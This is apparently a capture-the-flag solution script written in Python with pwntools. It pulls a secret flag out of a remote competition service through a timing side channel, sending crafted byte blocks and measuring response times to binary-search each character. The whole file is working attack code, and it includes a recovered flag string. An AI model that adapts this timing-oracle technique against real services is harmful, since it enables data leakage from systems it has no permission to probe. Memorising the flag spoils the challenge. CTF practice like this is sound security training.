from multiprocessing import Pool
from pwn import *
import os
import random
import time

context.log_level = 'error'

# proc = remote("localhost", 1337)
# curr = ""
# for i in range(256):
#     curr += chr(i) + "\x00" * 15
# # for i in range(256):
# #     if i < 0x30:
# #         curr += chr(i) + "\xff" * 15
# #     else:
# #         curr += chr(i) + "\x00" * 15
# proc.send(curr)
# proc.shutdown()

def run_binary(deet):
    pref, c, more = deet
    # proc = remote("localhost", 1337)
    proc = remote("tracing.2020.ctfcompetition.com", 1337)
    extra = 16 - len(pref) - 1
    curr = ""
    if more:
        curr += pref + chr(c) + "\xff" * extra
        for j in range(2**10):
            curr += pref + p32(j, endian='big').rjust(extra + 1, "\x00")
    else:
        curr += pref + chr(c) + "\x00" * extra
        for j in range(2**10):
            curr += pref + chr(c+1) + p32(j, endian='big').rjust(extra, "\x00")
    proc.send(curr)
    # print(len(curr)/16)
    proc.shutdown(direction='send')
    start = time.time()
    resp = proc.recvall()
    end = time.time()
    # print u32(resp, endian='big')
    # print hex(c)[2:], end-start
    proc.close()
    return int(more), end - start

# return True if pref+c <= flag
def search(pref, c):
    pool = Pool(processes=2)
    counts = [0, 0]
    for i in range(10):
        fin_ans = [0, 0]
        #print(i)
        args = [(pref, c, False), (pref, c, True)]
        random.shuffle(args)
        ans = pool.map(run_binary, args, chunksize=1)
        fin_ans[ans[0][0]] += ans[0][1]
        fin_ans[ans[1][0]] += ans[1][1]
        if fin_ans[0] > fin_ans[1]:
            counts[0] += 1
        else:
            counts[1] += 1
    return counts

flag = "CTF{1BitAtATime}"
for i in range(len(flag), 16):
    print "Char {}".format(i)
    L = 5
    R = 250
    while L < R:
        mid = (L + R + 1)/2
        ans = search(flag, mid)
        print L, R, mid, ans
        if ans[0] > ans[1]:
            L = mid
        else:
            R = mid


# flag = ""
#
# while True:
#     ans = [0]
#     for c in range(1, 255):
#         ans.append(run(flag, c))
#     sice = ans.index(max(ans))
#     print "Sice: ", sice, ans[sice]
#     flag += chr(sice)
#     print(flag)
#


